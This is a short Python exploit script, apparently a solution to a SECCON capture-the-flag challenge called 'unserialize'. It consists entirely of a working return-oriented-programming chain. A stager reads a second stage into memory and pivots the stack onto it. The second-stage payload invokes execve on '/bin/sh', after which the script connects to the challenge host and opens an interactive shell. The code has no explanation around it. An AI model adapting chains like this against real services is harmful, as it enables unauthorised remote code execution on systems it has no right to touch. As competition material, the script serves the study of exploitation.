#!/usr/bin/env python3
from pwn import *

"""
0x4866ec: pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x402418: pop rdi ; pop rbp ; ret
0x43617e: pop rsi ; ret
0x428490: read()
0x47e7c8: pop rsp ; ret
"""
stager  = b''
stager += p64(0x4866ec) + p64(0x100) + p64(0)*4
stager += p64(0x402418) + p64(0)*2
stager += p64(0x43617e) + p64(0x4cba00)
stager += p64(0x428490)
stager += p64(0x47e7c8) + p64(0x4cba00 + 0x8)

payload  = b''
payload += p64(0x4866ec) + p64(0) + p64(0)*4
payload += p64(0x402418) + p64(0x4cba00) + p64(0)
payload += p64(0x43617e) + p64(0)
payload += p64(0x4303ab) + p64(59)
payload += p64(0x401364)

io = remote("unserialize.seccon.games", 5000)
io.sendline(b"0113:" + stager.hex().encode() + (112 - len(stager))*b'41' + b"48")
io.sendline(b'/bin/sh\x00' + payload)
io.interactive()
